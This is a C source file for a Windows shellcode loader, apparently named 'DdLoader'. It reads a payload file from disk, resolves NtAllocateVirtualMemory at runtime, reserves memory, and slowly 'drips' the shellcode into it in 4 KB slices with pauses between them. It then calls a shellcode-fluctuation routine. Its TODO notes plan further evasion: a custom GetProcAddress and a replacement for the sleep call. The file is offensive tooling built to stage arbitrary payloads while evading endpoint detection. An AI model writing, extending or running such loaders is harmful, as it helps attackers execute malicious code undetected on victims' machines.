#include <Windows.h>
#include <stdio.h>

#include "common.h"

/* Todo:
Implement DripLoader technique to read shellcode from disk and "Drip" into HeapMemory
    - Replace sleep function
    - Custom GetProcAddress
*/

typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE             ProcessHandle,
    PVOID*             BaseAddress,
    ULONG              ZeroBits,
    PULONG             RegionSize,
    ULONG              AllocationType,
    ULONG              Protect
    );

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)


int main() {

    // -------------------- Print Banner --------------------
    PRINTA("\n\t\t [!] Did you know DdLoader stands for DING DONG Loader [!]\n\n\n\n\n");

    // -------------------- Initializating some variables --------------------
    HANDLE hHandle = (HANDLE)-1;                                        // Current process
    DWORD dwSize = 0;                                                   // Size of the shellcode in bytes
    SIZE_T stReservationGran = 0x10000;                                 // Reservation granularity (64 KB)
    SIZE_T stPageSize = 0x1000;                                         // Page size (4 KB)

    // -------------------- Creating Function pointer --------------------
    HMODULE ntdll = GetModuleHandleA("ntdll");
    pNtAllocateVirtualMemory NtAVM = (pNtAllocateVirtualMemory)GetProcAddress(ntdll, "NtAllocateVirtualMemory"); // Improvement: custom GetProcAddress


    // -------------------- Load the shellcode to determine the size --------------------
       PRINTA("[+] Reading Shellcode From Disk....\n");
    unsigned char* buf = ReadShellcode("PAYLOAD.bin", &dwSize);
    if (!buf) {
        PRINTA("[!] Failed to load shellcode.\n");
        return -1;
    }
    PRINTA("[+] Shellcode is %ld bytes.\n", dwSize);

    //  Calculate how many block/pages we need 
    DWORD dwReservationBlocks = (dwSize / stReservationGran) + 1;       // Number of 64 KB blocks needed
    DWORD dwPagesPerBlock = stReservationGran / stPageSize;             // Number of 4 KB pages per 64 KB block

    // Print out the calculated values:
    PRINTA("\t[i] Reservation Blocks needed: %lu\n", dwReservationBlocks);
    PRINTA("\t[i] Pages per Block: %lu\n", dwPagesPerBlock);

    // -------------------- Find memory big enough to hold the shellcode --------------------
    LPVOID pBaseAddress = GetShellcodeBaseAddress(hHandle, (DWORD)stPageSize, (DWORD)stReservationGran, dwReservationBlocks);
    if (pBaseAddress) {
        PRINTA("[+] Found suitable base address: 0x%p\n", pBaseAddress);
    }
    else {
        PRINTA("[!] No suitable base address found.\n");
    }

    // -------------------- MEM_RESERVE the found memory location --------------------
    DWORD dwSizeRounded = ((dwSize + stReservationGran - 1) / stReservationGran) * stReservationGran;   // Round dwSize up to the nearest multiple of stReservationGran
    PRINTA("\t [i] Calucating Rounded Size... : %u\n", dwSizeRounded);
    PVOID pReserved = pBaseAddress;

    // NtAllocateVirtualMemory function pointer
    NTSTATUS status = NtAVM(hHandle, &pReserved, 0, &dwSizeRounded, MEM_RESERVE, PAGE_NOACCESS);
        if (NT_SUCCESS(status)) {
            PRINTA("[+] MEM_RESERVE %u bytes at: 0x%p\n", dwSizeRounded, pReserved);
        }
        else {
            PRINTA("[!] NtAllocateVirtualMemory failed with: 0x%08X\n", GetLastError());
        };

    // -------------------- We drip slowly 'drip' the shellcode in 4KB slices --------------------
    PRINTA("\n[!] Press <Enter> To Start Dripping ...\n\n");
    WAIT_FOR_ENTER();

        
    DWORD dwOffset = 0;             // Counter to track how many bytes have been processed
    DWORD dwOldProtect = 0;

    // Print the total number of chunks needed for debugging.
    DWORD dwChunksNeeded = (dwSize + stPageSize - 1) / stPageSize;
    PRINTA("[i] Total chunks needed: %lu\n", dwChunksNeeded);

    while (dwOffset < dwSize)
    {

        // We make dwOffset 4KB
        SIZE_T chunkSize = ((dwOffset + stPageSize) <= dwSize) ? stPageSize : (dwSize - dwOffset);

        // First we calculate the 4KB copy adress and increment this with 4KB in the loop
        PVOID pCopyAddress = (LPBYTE)pReserved + dwOffset;
        PRINTA("\t[+] Committing memory at address 0x%p\n", pCopyAddress);

        // Change the first 4KB of the pReserved pointer to MEM_COMMIT, PAGE_READWRITE
        PVOID pCommitBase = pCopyAddress;
        SIZE_T stCommitSize = stPageSize;

        // NtAllocateVirtualMemory function pointer
        NTSTATUS status = NtAVM((HANDLE)-1, &pCommitBase, 0, &stCommitSize, MEM_COMMIT, PAGE_READWRITE);
        if (!NT_SUCCESS(status)) {
            PRINTA("[!] NtAllocateVirtualMemory failed at 0x%p with NTSTATUS: 0x%08X\n", pCopyAddress, status);
            return -1;
        }

        // We copy shellcode to pCopyAddress
        MoveMem(pCopyAddress, buf + dwOffset, chunkSize); // But it should only be the first 4KB of buf (which contains the shellcode)
   
        // Here to dwOffset should be increased by 4KB
        dwOffset += stPageSize;

        // We sleep - improve this using CreateTimerQueueTimer
        Sleep(100);

    }

    PRINTA("[+] Dripping complete.\n");

    // Trigger with Flucation shellcode should be READONLY
    PRINTA("[!] Press <Enter> To Fluctuate\n");
    WAIT_FOR_ENTER();

    if (!FluctuateShellcode(pBaseAddress, dwSize)) {
        PRINTA("[!] FluctuateShellcode failed.\n");
    }


    PRINTA("\n[+] Press <Enter> To Quit...\n");
    WAIT_FOR_ENTER();

    return 0;
};